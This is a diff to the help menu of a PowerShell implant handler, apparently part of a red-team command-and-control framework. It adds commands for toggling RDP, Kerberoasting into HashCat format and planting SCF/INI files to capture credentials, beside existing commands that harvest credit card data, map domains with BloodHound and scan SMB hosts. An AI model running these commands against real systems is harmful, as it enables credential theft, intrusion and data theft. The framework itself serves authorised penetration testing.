@@ -139,6 +139,8 @@ function Implant-Handler
         write-host " Invoke-DaisyChain -port 4444 -daisyserver 192.168.1.1" -ForegroundColor Green
         write-host " CreateProxyPayload -user <dom\user> -pass <pass> -proxyurl <http://10.0.0.1:8080>" -ForegroundColor Green
         write-host " Get-MSHotfixes" -ForegroundColor Green 
+        write-host " EnableRDP" -ForegroundColor Green
+        write-host " DisableRDP" -ForegroundColor Green
         write-host " Get-CreditCardData -Path 'C:\Backup\'" -ForegroundColor Green
         write-host `n "Privilege Escalation: " -ForegroundColor Green
         write-host "====================" -ForegroundColor Red
@@ -180,7 +182,9 @@ function Implant-Handler
         write-host ' Get-NetGroup | Select-String -pattern "Internet" ' -ForegroundColor Green
         write-host " Get-BloodHoundData -CollectionMethod 'Stealth' | Export-BloodHoundCSV" -ForegroundColor Green
         write-host " Get-BloodHoundData | Export-BloodHoundCSV" -ForegroundColor Green
-        write-host " Invoke-Kerberoast | f1" -ForegroundColor Green
+        write-host " Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash" -ForegroundColor Green
+        write-host " Write-SCFFile -IPaddress 127.0.0.1 -Location \\localhost\c$\temp\" -ForegroundColor Green
+        write-host " Write-INIFile -IPaddress 127.0.0.1 -Location \\localhost\c$\temp\" -ForegroundColor Green
         write-host ' Get-NetGroup | Select-String -pattern "Internet" ' -ForegroundColor Green
         write-host " Invoke-Hostscan -IPRangeCIDR 172.16.0.0/24 (Provides list of hosts with 445 open)" -ForegroundColor Green
         write-host " Invoke-ShareFinder -hostlist hosts.txt" -ForegroundColor Green
